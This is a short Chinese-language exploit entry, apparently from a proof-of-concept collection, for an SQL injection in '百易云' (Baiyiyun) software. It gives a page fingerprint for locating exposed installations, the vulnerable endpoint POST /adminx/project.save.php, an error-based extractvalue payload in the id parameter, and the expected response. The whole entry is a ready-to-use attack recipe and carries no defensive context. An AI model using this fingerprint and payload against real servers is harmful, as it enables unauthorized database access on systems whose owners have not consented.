# 百易云save存在SQL注入漏洞

百易云 ｜ SQL注入 ｜ —
- **指纹**：`body="media/css/uniform.default.css"`
- **请求**：`POST /adminx/project.save.php HTTP/1.1`

**Payload**
```
id=1+AND+extractvalue(1,concat(0x7e,md5(123)))
```
- **响应特征**：200